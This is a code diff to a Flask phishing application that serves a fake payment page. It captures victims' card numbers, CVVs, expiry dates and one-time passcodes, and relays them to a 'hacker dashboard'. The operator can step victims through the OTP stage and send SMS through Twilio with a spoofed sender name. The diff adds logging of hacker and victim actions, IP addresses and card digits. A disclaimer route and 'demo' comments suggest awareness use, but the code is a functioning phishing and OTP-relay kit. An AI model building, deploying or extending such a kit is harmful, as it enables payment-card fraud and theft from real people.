@@ -105,6 +105,12 @@ _captured_data: Dict[str, Optional[Dict[str, str]]] = {
     'otp': None
 }
 
+# Activity logging storage - List of log entries
+# Hacker logs: datetime, IP, user, action, outcome
+# Victim logs: datetime, IP, action, outcome, last_4_digits
+_activity_logs: list[Dict[str, str]] = []
+MAX_LOG_ENTRIES = 10000
+
 def get_ready_for_alert() -> bool:
     """Thread-safe getter for ready_for_alert"""
     with _state_lock:
@@ -141,6 +147,62 @@ def clear_captured_data() -> None:
             'card': None,
             'otp': None
         }
+
+def log_hacker_activity(ip: str, action: str, outcome: str) -> None:
+    """Log hacker activity with timestamp, IP, username, action, and outcome"""
+    global _activity_logs
+    with _state_lock:
+        _activity_logs.append({
+            'type': 'hacker',
+            'datetime': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+            'ip': ip,
+            'user': ADMIN_USERNAME,
+            'action': action,
+            'outcome': outcome,
+            'last_4_digits': ''  # Not applicable for hacker logs
+        })
+        # Roll logs if exceeding max entries (keep most recent)
+        if len(_activity_logs) > MAX_LOG_ENTRIES:
+            _activity_logs = _activity_logs[-MAX_LOG_ENTRIES:]
+
+def log_victim_activity(ip: str, action: str, outcome: str, last_4_digits: str = '') -> None:
+    """Log victim activity with timestamp, IP, action, outcome, and last 4 digits of card"""
+    global _activity_logs
+    with _state_lock:
+        _activity_logs.append({
+            'type': 'victim',
+            'datetime': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+            'ip': ip,
+            'user': '',  # Not applicable for victim logs
+            'action': action,
+            'outcome': outcome,
+            'last_4_digits': last_4_digits
+        })
+        # Roll logs if exceeding max entries (keep most recent)
+        if len(_activity_logs) > MAX_LOG_ENTRIES:
+            _activity_logs = _activity_logs[-MAX_LOG_ENTRIES:]
+
+def get_activity_logs() -> list[Dict[str, str]]:
+    """Thread-safe getter for activity logs"""
+    with _state_lock:
+        return _activity_logs.copy()
+
+def clear_activity_logs() -> None:
+    """Thread-safe method to clear all activity logs"""
+    global _activity_logs
+    with _state_lock:
+        _activity_logs = []
+
+def get_client_ip() -> str:
+    """Get client IP address from request, handling proxies"""
+    # Check for X-Forwarded-For header (Cloudflare, NPM, etc.)
+    if request.headers.get('X-Forwarded-For'):
+        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
+    # Check for X-Real-IP header
+    if request.headers.get('X-Real-IP'):
+        return request.headers.get('X-Real-IP')
+    # Fall back to remote_addr
+    return request.remote_addr or 'unknown'
 
 # Input validation functions
 def validate_phone_number(phone: str) -> bool:
@@ -225,9 +287,16 @@ def login():
             session.clear()
             session['authenticated'] = True
             session.permanent = False
+
+            # Log successful login
+            log_hacker_activity(get_client_ip(), 'Login', 'Success')
+
             return redirect(url_for('hacker_dashboard'))
         else:
             error = 'Invalid username or password'
+
+            # Log failed login attempt
+            log_hacker_activity(get_client_ip(), 'Login Attempt', 'Failed')
 
     return render_template('login.html', error=error)
 
@@ -244,6 +313,9 @@ def disclaimer():
 @app.route('/', methods=['GET'])
 def phishing_form():
     """Serve the fake payment form"""
+    # Log victim accessing the phishing page
+    log_victim_activity(get_client_ip(), 'Access Main Page', 'Success')
+
     return render_template('phishing_form.html', company_hebrew=COMPANY_HEBREW)
 
 @app.route('/submit', methods=['POST'])
@@ -260,15 +332,23 @@ def submit_card():
 
         # Validate inputs
         if not card_name or len(card_name) < 3 or len(card_name) > MAX_NAME_LENGTH:
+            # Log failed card submission
+            log_victim_activity(get_client_ip(), 'Enter Card Data', 'Failed - Invalid Name', '')
             return "Invalid cardholder name", 400
 
         if not validate_card_number(card_number):
+            # Log failed card submission
+            log_victim_activity(get_client_ip(), 'Enter Card Data', 'Failed - Invalid Card', '')
             return "Invalid card number", 400
 
         if not validate_expiry(expiry):
+            # Log failed card submission
+            log_victim_activity(get_client_ip(), 'Enter Card Data', 'Failed - Invalid Expiry', '')
             return "Invalid expiry date", 400
 
         if not validate_cvv(cvv):
+            # Log failed card submission
+            log_victim_activity(get_client_ip(), 'Enter Card Data', 'Failed - Invalid CVV', '')
             return "Invalid CVV", 400
 
         # Sanitize and store inputs
@@ -282,9 +362,15 @@ def submit_card():
 
         # Store for hacker dashboard
         set_card_data(captured)
+
+        # Log successful card submission with last 4 digits
+        last_4 = card_number[-4:] if len(card_number) >= 4 else card_number
+        log_victim_activity(get_client_ip(), 'Enter Card Data', 'Success', last_4)
+
     except Exception as e:
         # Log error but don't expose details to user
         app.logger.error(f"Error in submit_card: {str(e)}")
+        log_victim_activity(get_client_ip(), 'Enter Card Data', 'Failed - Server Error', '')
         return "An error occurred processing your request", 500
 
     return render_template('loading.html')
@@ -309,11 +395,21 @@ def hacker_data():
     """API endpoint for hacker dashboard data"""
     return jsonify(get_captured_data())
 
+@app.route('/hacker/logs', methods=['GET'])
+@require_auth
+def hacker_logs():
+    """API endpoint for activity logs"""
+    return jsonify({'logs': get_activity_logs()})
+
 @app.route('/hacker/continue', methods=['POST'])
 @require_auth
 def hacker_continue():
     """API endpoint to continue victim flow"""
     set_ready_for_alert(True)
+
+    # Log hacker advancing the victim to OTP stage
+    log_hacker_activity(get_client_ip(), 'Advance to OTP', 'Success')
+
     return jsonify({'success': True})
 
 @app.route('/hacker/clear', methods=['POST'])
@@ -322,6 +418,13 @@ def hacker_clear():
     """API endpoint to clear captured data and reset for new demo"""
     set_ready_for_alert(False)
     clear_captured_data()
+    return jsonify({'success': True})
+
+@app.route('/hacker/clear_logs', methods=['POST'])
+@require_auth
+def hacker_clear_logs():
+    """API endpoint to clear activity logs"""
+    clear_activity_logs()
     return jsonify({'success': True})
 
 @app.route('/transaction_alert', methods=['GET'])
@@ -348,6 +451,11 @@ def verify_otp():
 
         # Validate OTP
         if not validate_otp(otp):
+            # Log failed OTP submission
+            captured_data = get_captured_data()
+            card_data = captured_data.get('card')
+            last_4 = card_data.get('card_number', '')[-4:] if card_data and card_data.get('card_number') else ''
+            log_victim_activity(get_client_ip(), 'Enter OTP', 'Failed - Invalid OTP', last_4)
             return "Invalid OTP code", 400
 
         # Store OTP with sanitization
@@ -360,11 +468,15 @@ def verify_otp():
         reference_number = "N/A"
         captured_data = get_captured_data()
         card_data = captured_data.get('card')
+        last_4 = ''
         if card_data:
             try:
                 # Extract card number and CVV (remove any non-digit characters)
                 card_number = re.sub(r'\D', '', card_data.get('card_number', ''))
                 cvv = re.sub(r'\D', '', card_data.get('cvv', ''))
+
+                # Get last 4 digits for logging
+                last_4 = card_number[-4:] if len(card_number) >= 4 else card_number
 
                 if card_number and cvv:
                     # Calculate: (card_number + cvv) % REFERENCE_NUMBER_MODULO + REFERENCE_NUMBER_BASE
@@ -375,9 +487,17 @@ def verify_otp():
                     reference_number = str(((card_int + cvv_int) % REFERENCE_NUMBER_MODULO) + REFERENCE_NUMBER_BASE)
             except ValueError:
                 reference_number = "N/A"
+
+        # Log successful OTP submission
+        log_victim_activity(get_client_ip(), 'Enter OTP', 'Success', last_4)
+
     except Exception as e:
         # Log error but don't expose details to user
         app.logger.error(f"Error in verify_otp: {str(e)}")
+        captured_data = get_captured_data()
+        card_data = captured_data.get('card')
+        last_4 = card_data.get('card_number', '')[-4:] if card_data and card_data.get('card_number') else ''
+        log_victim_activity(get_client_ip(), 'Enter OTP', 'Failed - Server Error', last_4)
         return "An error occurred processing your request", 500
 
     return render_template('verification_success.html', reference_number=reference_number, company_hebrew=COMPANY_HEBREW)
@@ -396,20 +516,25 @@ def send_sms():
 
         # Validate required fields
         if not all([from_number, to_number, message_body]):
+            log_hacker_activity(get_client_ip(), 'Send SMS', 'Failed - Missing Fields')
             return jsonify({'error': 'Missing required fields'}), 400
 
         # Validate phone numbers
         if not validate_phone_number(from_number):
+            log_hacker_activity(get_client_ip(), 'Send SMS', 'Failed - Invalid From Number')
             return jsonify({'error': 'Invalid "from" number format. Use E.164 format (e.g., +1234567890) or alphanumeric sender ID (e.g., Cal)'}), 400
 
         if not validate_phone_number(to_number):
+            log_hacker_activity(get_client_ip(), 'Send SMS', 'Failed - Invalid To Number')
             return jsonify({'error': 'Invalid "to" phone number format. Use E.164 format (e.g., +1234567890)'}), 400
 
         # Validate message length (Twilio limit)
         if len(message_body) > MAX_SMS_LENGTH:
+            log_hacker_activity(get_client_ip(), 'Send SMS', 'Failed - Message Too Long')
             return jsonify({'error': f'Message too long. Maximum {MAX_SMS_LENGTH} characters.'}), 400
 
         if len(message_body) < 1:
+            log_hacker_activity(get_client_ip(), 'Send SMS', 'Failed - Empty Message')
             return jsonify({'error': 'Message cannot be empty'}), 400
 
         # Send SMS via Twilio
@@ -420,6 +545,9 @@ def send_sms():
             to=to_number
         )
 
+        # Log successful SMS send
+        log_hacker_activity(get_client_ip(), f'Send SMS to {to_number}', 'Success')
+
         return jsonify({
             'success': True,
             'sid': message.sid,
@@ -429,6 +557,7 @@ def send_sms():
     except Exception as e:
         # Log the full error but return generic message
         app.logger.error(f"Error sending SMS: {str(e)}")
+        log_hacker_activity(get_client_ip(), 'Send SMS', 'Failed - Twilio Error')
         return jsonify({'error': 'Failed to send SMS. Please check your credentials and try again.'}), 500
 
 # Gunicorn will import and run this app directly
